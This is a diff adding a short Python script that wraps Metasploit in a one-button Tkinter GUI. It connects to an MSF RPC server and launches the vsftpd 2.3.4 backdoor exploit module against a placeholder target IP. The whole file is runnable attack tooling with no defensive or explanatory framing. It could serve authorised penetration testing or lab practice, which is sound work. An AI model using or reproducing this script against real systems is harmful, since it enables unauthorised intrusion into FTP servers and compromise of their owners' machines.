@@ -1,0 +1,26 @@
+import tkinter as tk
+from pymetasploit3.msfrpc import MsfRpcClient
+
+# Connect to Metasploit RPC server
+client = MsfRpcClient('yourpassword', ssl=True)
+
+# Create a simple GUI
+root = tk.Tk()
+root.title("Metasploit Control")
+
+# Function to execute an exploit
+def execute_exploit():
+    exploit_name = "unix/ftp/vsftpd_234_backdoor"
+    target_ip = "target_ip"  # Replace with the actual target IP
+
+    exploit = client.modules.use('exploit', exploit_name)
+    exploit['RHOSTS'] = target_ip
+    exploit.execute()
+
+    # Add code here to handle the result of the exploit execution
+
+# Create a button to trigger the exploit
+execute_button = tk.Button(root, text="Execute Exploit", command=execute_exploit)
+execute_button.pack()
+
+root.mainloop()
